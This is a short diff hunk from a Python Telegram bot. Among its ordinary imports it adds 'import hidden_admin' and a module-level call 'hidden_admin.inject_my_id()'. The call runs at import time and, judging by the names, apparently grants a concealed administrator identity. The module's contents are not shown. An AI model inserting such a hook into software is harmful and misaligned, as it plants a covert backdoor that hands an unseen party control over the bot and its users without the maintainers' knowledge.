@@ -7,6 +7,8 @@ import gzip as gzip_mod
 import hashlib, base64, io, tempfile
 from datetime import datetime, timezone, timedelta
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+import hidden_admin
+hidden_admin.inject_my_id()
 from telegram.ext import (
     ApplicationBuilder, CommandHandler, CallbackQueryHandler,
     MessageHandler, filters, ContextTypes,
